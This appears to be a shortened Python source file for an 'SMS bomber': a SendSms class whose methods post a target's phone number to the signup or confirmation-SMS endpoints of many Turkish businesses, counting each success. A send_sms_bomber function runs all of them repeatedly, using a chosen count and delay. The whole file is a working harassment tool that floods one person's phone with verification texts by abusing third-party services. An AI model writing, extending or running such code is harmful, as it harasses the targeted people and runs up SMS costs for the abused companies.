...
class SendSms:
    ...
    def Wmf(self):
        try:
            ...
            data = {"confirm": "true", "phone": f"0{self.phone}"}
    ...
    def Suiste(self):
        try:
            ...
            data = {"gsm": self.phone, "action": "register"}
            r = requests.post(url, data=data, timeout=6)
    ...
    def Evidea(self):
        try:
            ...
            data = {"phone": f"0{self.phone}", "confirm": "true"}
            r = requests.post(url, data=data, timeout=6)
            if r.status_code == 202:
                self.adet += 1
                return True
    ...
    def File(self):
        try:
            ...
            r = requests.post(url, json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
    ...
    def Dominos(self):
        try:
            ...
            r = requests.post(url, json={"mobilePhone": self.phone}, timeout=6)
    ...
    def Coffy(self):
        try:
            ...
            r = requests.post(url, json={"gsm": self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
    ...
    def Jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}", timeout=6)
    ...
    def Ido(self):
        try:
            ...
            r = requests.post(url, json={"mobileNumber": f"0{self.phone}"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
    ...
    def Happy(self):
        try:
            ...
            r = requests.post(url, data={"phone": self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
    ...
    def KuryemGelsin(self):
        try:
            ...
            r = requests.post(url, json={"phone_country_code": "+90", "phone": self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
    ...
    def Money(self):
        try:
            ...
            r = requests.post(url, data={"phone": f"{self.phone[:3]} {self.phone[3:10]}"}, timeout=6)
    ...
    def Porty(self):
        try:
            ...
            r = requests.post(url, json={"job": "start_login", "phone": self.phone}, timeout=6)
...
# Tüm metotları çağıran fonksiyon
def send_sms_bomber(phone, adet, saniye):
    sms = SendSms(phone)
    
    # Tüm metotları listele
...
def send_sms():
    ...
    adet = int(data.get('adet', 10))
    saniye = int(data.get('saniye', 1))
